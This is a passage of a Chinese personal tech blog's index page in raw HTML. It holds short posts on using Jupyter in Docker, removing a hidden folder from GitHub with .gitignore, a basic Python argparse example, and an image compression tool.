<p>首先是<code>jupyter</code>的web界面</p>
<p>网址就是服务器地址的8888端口.之后会让你输入token.</p>
<p>看一下启动docker服务的那个终端,也就是执行了<code>docker run --rm -p 8888:8888 -v /root/downloads:/downloads jupyter/all-spark-notebook</code>的那个终端,第七行就是.</p>
<p><img src="https://raw.githubusercontent.com/gwjczwy/gwjczwy.github.io/master/img/010x01.png" alt="黄框框里的值就是token...话说不是写了`token=`的字样吗"></p>
<p>然后写文件的时候注意一下写在映射的目录下,不然还要移动到宿主机很麻烦.</p>
<p>然后用docker的一个缺点就是没法把jupyter当作web版的命令行用.因为命令都执行到虚拟机里去了.</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/06/07/git如何忽略隐藏的文件夹/">git如何忽略隐藏的文件夹,以及删除GitHub上的隐藏文件夹</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-06-07</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/技术/">技术</a></span><div class="content"><p>.gitignore写法:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.gitignore</span><br><span class="line">.history/*</span><br></pre></td></tr></table></figure>
<p>其中<code>.history</code>文件夹为隐藏文件夹.</p>
<p>往GitHub上推代码的时候不小心把项目的历史版本记录都推上去了.于是写了个gitignore忽略掉.</p>
<p>但一开始怎么改变<code>gitignore</code>的规则都无法删除GitHub上的<code>.history</code>文件夹.</p>
<p>最终发现了一个”笨方法”,还算管用:</p>
<ol>
<li><p>真的删除该文件夹(改名字也行,但要把改名后的文件夹写到<code>.gitignore</code>中去.语法就像上面<code>.history/*</code>那样)</p>
</li>
<li><p>把这个版本推上去</p>
</li>
<li><p>恢复刚才删除的文件夹</p>
</li>
<li><p>修改<code>.gitignore</code>文件,把一开始要忽略的隐藏文件夹加上</p>
</li>
</ol>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/06/05/argparse简单讲解/">argparse简单讲解</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-06-05</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/技术/">技术</a></span><div class="content"><h1 id="简单实例"><a href="#简单实例" class="headerlink" title="简单实例"></a>简单实例</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建对象</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line"><span class="comment"># 添加参数</span></span><br><span class="line">parser.add_argument(<span class="string">'-u'</span>,help=<span class="string">"指定URL"</span>)</span><br><span class="line">parser.add_argument(<span class="string">'-n'</span>,help=<span class="string">'指定名称'</span>)</span><br><span class="line"><span class="comment"># 获取参数</span></span><br><span class="line">args=parser.parse_args()</span><br><span class="line"><span class="comment">#输出一下看看</span></span><br><span class="line">print(args)</span><br><span class="line"><span class="comment"># 如果有参数不为空则退出</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.u <span class="keyword">or</span> <span class="keyword">not</span> args.n:</span><br><span class="line"> print(<span class="string">'请确保参数完整,传递 u,n 两个参数'</span>)</span><br><span class="line"> print(<span class="string">'详见参数 -h'</span>)</span><br><span class="line"> exit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 到这里为止应确保参数获取正常</span></span><br><span class="line"><span class="comment"># 下面就可以不用操心用户传递参数的问题,专心写业务逻辑了.但一定要确保参数传递无误,防止程序报错</span></span><br><span class="line"><span class="comment"># ....</span></span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python run.py -u www.baidu.com -n wdname</span><br></pre></td></tr></table></figure>
<h3 id="就先写到这里-现阶段也就用到这些-以后进阶了再来补吧"><a href="#就先写到这里-现阶段也就用到这些-以后进阶了再来补吧" class="headerlink" title="就先写到这里,现阶段也就用到这些.以后进阶了再来补吧."></a>就先写到这里,现阶段也就用到这些.以后进阶了再来补吧.</h3></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/05/21/开箱一个无损压缩图片程序/">开箱一个无损压缩图片程序</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-05-21</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/闲聊/">闲聊</a></span><div class="content"><p>这两天写简历才发现简历上东西少,于是就把很久之前写的这么个小玩意拿出来水一篇项目.顺便水一篇博客,我真是个天才.哈哈</p>
<p>其实很早之前就有了个这么个东西,只是一直没想起来放到GitHub上来.一方面是因为懒,一方面是因为没这个意识.</p>
<p>最近在翻以前写的代码看看有没有什么能拿得出手的.</p>
<p>这个小玩意的确没太有什么技术含量,都是直接调用的Python库.</p>
<p>不过他小巧易用.一个单文件,放到哪就能直接压缩当前文件夹下的所有图片.最重要的是性能很高,平均大概能压缩掉40%的原占空间.对于向我这样的电脑里存了几十个G的小姐姐的人来说节省下来的空间还是很客观的😆</p>
<p>这个项目也就相当于把Python的一个库给exe化了而已.😂</p>
<p><a href="https://github.com/gwjczwy/Lossless-image-compression" target="_blank" rel="noopener">项目地址</a></p>
</div><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://raw.githubusercontent.com/gwjczwy/gwjczwy.github.io/master/img/background.png)"><div class="layout" id="footer"><div class="copyright">&copy;2019 - 2021 By Arnoux</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>